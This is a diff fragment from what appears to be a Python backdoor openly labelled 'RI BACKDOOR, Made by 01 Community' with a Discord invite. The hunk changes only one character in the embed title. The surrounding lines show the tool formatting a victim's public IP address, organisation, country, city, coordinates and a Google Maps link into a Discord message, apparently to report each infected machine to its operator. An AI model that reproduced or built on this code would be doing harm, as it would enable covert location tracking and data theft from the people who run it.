@@ -72,7 +72,7 @@ while should_continue:
 
     embed = discord.Embed()
     embed.color = 0xffffff
-    embed.add_field(name ="*RI BACKDOOR, Made by 01 Community ! Discord > https://discord.gg/9EQSJAm3rf*", value = f"", inline = False)
+    embed.add_field(name ="*RI BACKDOOR, Made by 01 Community ! Discord : https://discord.gg/9EQSJAm3rf*", value = f"", inline = False)
     embed.add_field(name ="", value = f"", inline = False)
     embed.add_field(name ="**NETWORK INFORMATION :**", value = f"", inline = False)
     embed.add_field(name ="", value=f"``✲ 🍉``*``Adresse IP : {public_ip}``*\n``✲ 🍉``*``Organisation : {organization}``*\n``✲ 🍉``*``Pays : {country}``*\n``✲ 🍉``*``Ville : {city}``*\n``✲ 🍉``*``Latitude : {latitude}``*\n``✲ 🍉``*``Longitude : {longitude}``*\n``✲ 🍉``*``Link : {google_maps_link}``*", inline = False)
